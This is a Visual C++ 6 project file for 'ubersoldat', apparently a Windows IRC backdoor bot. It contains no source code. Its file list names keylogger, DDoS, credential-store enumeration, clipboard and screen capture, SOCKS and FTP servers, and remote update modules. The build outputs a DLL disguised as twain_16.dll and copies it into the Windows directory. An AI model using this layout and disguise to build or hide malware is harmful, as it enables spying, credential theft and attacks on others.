# Microsoft Developer Studio Project File - Name="ubersoldat" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=ubersoldat - Win32 Debug
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "ubersoldat.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "ubersoldat.mak" CFG="ubersoldat - Win32 Debug"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "ubersoldat - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE "ubersoldat - Win32 Debug" (based on "Win32 (x86) Application")
!MESSAGE "ubersoldat - Win32 Full Release" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "ubersoldat - Win32 Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 1
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /Yu"stdafx.h" /FD /c
# ADD CPP /nologo /MD /W3 /GX /D "WIN32" /D "NDEBUG" /D "_MBCS" /FR /FD /Gs /GT /GA /c
# SUBTRACT CPP /YX /Yc /Yu
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x419 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386
# ADD LINK32 psapi.lib oleaut32.lib comsupp.lib msvcrt.lib Wininet.lib Ws2_32.lib kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib uuid.lib odbc32.lib odbccp32.lib comctl32.lib /nologo /stack:0x400000 /entry:"DllMain" /subsystem:windows /dll /pdb:none /map:"d:\temp\ubersoldat\twain_16.map" /machine:I386 /nodefaultlib /def:"twain_16.def" /out:"m:\temp\ubersoldat\twain_16.dll"
# Begin Special Build Tool
SOURCE="$(InputPath)"
PostBuild_Cmds=del c:\windows\twain_16.dll	copy m:\temp\ubersoldat\twain_16.dll c:\windows
# End Special Build Tool

!ELSEIF  "$(CFG)" == "ubersoldat - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 1
# PROP BASE Output_Dir "Debug"
# PROP BASE Intermediate_Dir "Debug"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 1
# PROP Output_Dir "Debug"
# PROP Intermediate_Dir "Debug"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /Gm /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "_MBCS" /Yu"stdafx.h" /FD /GZ /c
# ADD CPP /nologo /MTd /W3 /GX /Zi /Od /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "_MBCS" /FR /FD /GZ /c
# SUBTRACT CPP /YX /Yc /Yu
# ADD BASE MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x419 /d "_DEBUG"
# ADD RSC /l 0x409 /d "_DEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /debug /machine:I386 /pdbtype:sept
# ADD LINK32 msvcrt.lib Wininet.lib Ws2_32.lib kernel32.lib user32.lib gdi32.lib Advapi32.lib /nologo /entry:"ServiceMain" /subsystem:windows /dll /incremental:no /map /debug /machine:I386 /nodefaultlib /def:"twain_16.def" /out:"Debug/twain_16.dll"
# SUBTRACT LINK32 /pdb:none

!ELSEIF  "$(CFG)" == "ubersoldat - Win32 Full Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "ubersoldat___Win32_Full_Release"
# PROP BASE Intermediate_Dir "ubersoldat___Win32_Full_Release"
# PROP BASE Ignore_Export_Lib 1
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "ubersoldat___Win32_Full_Release"
# PROP Intermediate_Dir "ubersoldat___Win32_Full_Release"
# PROP Ignore_Export_Lib 1
# PROP Target_Dir ""
# ADD BASE CPP /nologo /MD /W3 /Gf /D "WIN32" /D "NDEBUG" /D "_MBCS" /Fp"Release/twain_16.pch" /YX /FD /Gs /GA /c
# ADD CPP /nologo /MD /W3 /Gi /O1 /Ob0 /D "WIN32" /D "NDEBUG" /D "_MBCS" /D "FRELEASE" /FR /YX /FD /Gs /GA
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 Wininet.lib Ws2_32.lib kernel32.lib user32.lib gdi32.lib Advapi32.lib /nologo /entry:"DllMain" /subsystem:windows /dll /pdb:none /map /machine:I386 /def:"twain_16.def" /out:"Release/twain_16.dll"
# ADD LINK32 psapi.lib oleaut32.lib comsupp.lib MSVCRT.LIB Wininet.lib Ws2_32.lib kernel32.lib user32.lib gdi32.lib Advapi32.lib /nologo /stack:0x400000 /entry:"DllMain" /subsystem:windows /dll /pdb:none /map:"d:\temp\ubersoldat\twain_16.map" /machine:I386 /nodefaultlib /def:"twain_16.def" /out:"m:\temp\ubersoldat\twain_16.dll"

!ENDIF 

# Begin Target

# Name "ubersoldat - Win32 Release"
# Name "ubersoldat - Win32 Debug"
# Name "ubersoldat - Win32 Full Release"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Source File

SOURCE=.\auth.cpp
# End Source File
# Begin Source File

SOURCE=.\blowfish.cpp
# End Source File
# Begin Source File

SOURCE=.\bscs_client.cpp
# End Source File
# Begin Source File

SOURCE=.\capture.cpp
# End Source File
# Begin Source File

SOURCE=.\cleanup.cpp
# End Source File
# Begin Source File

SOURCE=.\clipboard.cpp
# End Source File
# Begin Source File

SOURCE=.\cmd_dns.cpp
# End Source File
# Begin Source File

SOURCE=.\configuration.cpp
# End Source File
# Begin Source File

SOURCE=.\consistance.cpp
# End Source File
# Begin Source File

SOURCE=.\dcc.cpp
# End Source File
# Begin Source File

SOURCE=.\ddos.cpp
# End Source File
# Begin Source File

SOURCE=.\desktop.cpp
# End Source File
# Begin Source File

SOURCE=.\dns.cpp

!IF  "$(CFG)" == "ubersoldat - Win32 Release"

!ELSEIF  "$(CFG)" == "ubersoldat - Win32 Debug"

# ADD CPP /FAs /FR

!ELSEIF  "$(CFG)" == "ubersoldat - Win32 Full Release"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\dropfile.cpp
# End Source File
# Begin Source File

SOURCE=.\enumpstorage.cpp
# End Source File
# Begin Source File

SOURCE=.\findfile.cpp
# End Source File
# Begin Source File

SOURCE=.\ftp_server.cpp
# End Source File
# Begin Source File

SOURCE=.\get_info.cpp
# End Source File
# Begin Source File

SOURCE=.\globals.cpp

!IF  "$(CFG)" == "ubersoldat - Win32 Release"

!ELSEIF  "$(CFG)" == "ubersoldat - Win32 Debug"

# ADD CPP /FAs /FR

!ELSEIF  "$(CFG)" == "ubersoldat - Win32 Full Release"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\http_get.cpp

!IF  "$(CFG)" == "ubersoldat - Win32 Release"

!ELSEIF  "$(CFG)" == "ubersoldat - Win32 Debug"

# ADD CPP /FAs /FR

!ELSEIF  "$(CFG)" == "ubersoldat - Win32 Full Release"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\http_log.cpp

!IF  "$(CFG)" == "ubersoldat - Win32 Release"

!ELSEIF  "$(CFG)" == "ubersoldat - Win32 Debug"

# ADD CPP /FAs /FR

!ELSEIF  "$(CFG)" == "ubersoldat - Win32 Full Release"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\http_server.cpp
# End Source File
# Begin Source File

SOURCE=.\http_update.cpp

!IF  "$(CFG)" == "ubersoldat - Win32 Release"

!ELSEIF  "$(CFG)" == "ubersoldat - Win32 Debug"

# ADD CPP /FAs /FR

!ELSEIF  "$(CFG)" == "ubersoldat - Win32 Full Release"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\icf.cpp
# End Source File
# Begin Source File

SOURCE=.\identd.cpp

!IF  "$(CFG)" == "ubersoldat - Win32 Release"

!ELSEIF  "$(CFG)" == "ubersoldat - Win32 Debug"

# ADD CPP /FAs /FR

!ELSEIF  "$(CFG)" == "ubersoldat - Win32 Full Release"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\irc_commands.cpp
# End Source File
# Begin Source File

SOURCE=.\irc_core.cpp

!IF  "$(CFG)" == "ubersoldat - Win32 Release"

!ELSEIF  "$(CFG)" == "ubersoldat - Win32 Debug"

# ADD CPP /FAs /FR

!ELSEIF  "$(CFG)" == "ubersoldat - Win32 Full Release"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\keylogger.cpp
# End Source File
# Begin Source File

SOURCE=.\lzss.cpp
# End Source File
# Begin Source File

SOURCE=.\memory.cpp
# End Source File
# Begin Source File

SOURCE=.\misc.cpp

!IF  "$(CFG)" == "ubersoldat - Win32 Release"

!ELSEIF  "$(CFG)" == "ubersoldat - Win32 Debug"

# ADD CPP /FAs /FR

!ELSEIF  "$(CFG)" == "ubersoldat - Win32 Full Release"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\misc_inet.cpp

!IF  "$(CFG)" == "ubersoldat - Win32 Release"

!ELSEIF  "$(CFG)" == "ubersoldat - Win32 Debug"

# ADD CPP /FAs /FR

!ELSEIF  "$(CFG)" == "ubersoldat - Win32 Full Release"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\processes.cpp
# End Source File
# Begin Source File

SOURCE=.\registry.cpp
# End Source File
# Begin Source File

SOURCE=.\secure_sockets.cpp
# End Source File
# Begin Source File

SOURCE=.\socket.cpp

!IF  "$(CFG)" == "ubersoldat - Win32 Release"

!ELSEIF  "$(CFG)" == "ubersoldat - Win32 Debug"

# ADD CPP /FAs /FR

!ELSEIF  "$(CFG)" == "ubersoldat - Win32 Full Release"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\socks_core.cpp

!IF  "$(CFG)" == "ubersoldat - Win32 Release"

!ELSEIF  "$(CFG)" == "ubersoldat - Win32 Debug"

# ADD CPP /FAs /FR

!ELSEIF  "$(CFG)" == "ubersoldat - Win32 Full Release"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\ssl.cpp
# End Source File
# Begin Source File

SOURCE=.\sys_related.cpp
# End Source File
# Begin Source File

SOURCE=.\sysinfo.cpp
# End Source File
# Begin Source File

SOURCE=.\tcp_update.cpp
# End Source File
# Begin Source File

SOURCE=.\threads.cpp
# End Source File
# Begin Source File

SOURCE=.\toolz.cpp

!IF  "$(CFG)" == "ubersoldat - Win32 Release"

!ELSEIF  "$(CFG)" == "ubersoldat - Win32 Debug"

# ADD CPP /FAs /FR

!ELSEIF  "$(CFG)" == "ubersoldat - Win32 Full Release"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\ubersoldat.cpp

!IF  "$(CFG)" == "ubersoldat - Win32 Release"

!ELSEIF  "$(CFG)" == "ubersoldat - Win32 Debug"

# ADD CPP /FAs /FR

!ELSEIF  "$(CFG)" == "ubersoldat - Win32 Full Release"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\udp_functions.cpp
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Source File

SOURCE=.\auth.h
# End Source File
# Begin Source File

SOURCE=.\blowfish.h
# End Source File
# Begin Source File

SOURCE=.\bscs_client.h
# End Source File
# Begin Source File

SOURCE=.\capture.h
# End Source File
# Begin Source File

SOURCE=.\cleanup.h
# End Source File
# Begin Source File

SOURCE=.\clipboard.h
# End Source File
# Begin Source File

SOURCE=.\cmd_dns.h
# End Source File
# Begin Source File

SOURCE=.\configuration.h
# End Source File
# Begin Source File

SOURCE=.\consistance.h
# End Source File
# Begin Source File

SOURCE=.\dcc.h
# End Source File
# Begin Source File

SOURCE=.\ddos.h
# End Source File
# Begin Source File

SOURCE=.\enumpstorage.h
# End Source File
# Begin Source File

SOURCE=.\extern.h
# End Source File
# Begin Source File

SOURCE=.\findfile.h
# End Source File
# Begin Source File

SOURCE=.\ftp_server.h
# End Source File
# Begin Source File

SOURCE=.\host_conf.h
# End Source File
# Begin Source File

SOURCE=.\http_server.h
# End Source File
# Begin Source File

SOURCE=.\icf.h
# End Source File
# Begin Source File

SOURCE=.\keylogger.h
# End Source File
# Begin Source File

SOURCE=.\lzss.h
# End Source File
# Begin Source File

SOURCE=.\memory.h
# End Source File
# Begin Source File

SOURCE=.\misc.h
# End Source File
# Begin Source File

SOURCE=.\misc_inet.h
# End Source File
# Begin Source File

SOURCE=.\processes.h
# End Source File
# Begin Source File

SOURCE=.\registry.h
# End Source File
# Begin Source File

SOURCE=.\secure_sockets.h
# End Source File
# Begin Source File

SOURCE=.\socks_core.h
# End Source File
# Begin Source File

SOURCE=.\ssl.h
# End Source File
# Begin Source File

SOURCE=.\StdAfx.h
# End Source File
# Begin Source File

SOURCE=.\tcp_update.h
# End Source File
# Begin Source File

SOURCE=.\threads.h
# End Source File
# Begin Source File

SOURCE=.\udp_functions.h
# End Source File
# Begin Source File

SOURCE=.\version.h
# End Source File
# End Group
# Begin Source File

SOURCE=.\dump_of_hk.txt
# End Source File
# Begin Source File

SOURCE=.\irc_commands.txt
# End Source File
# Begin Source File

SOURCE=.\todo.txt
# End Source File
# End Target
# End Project
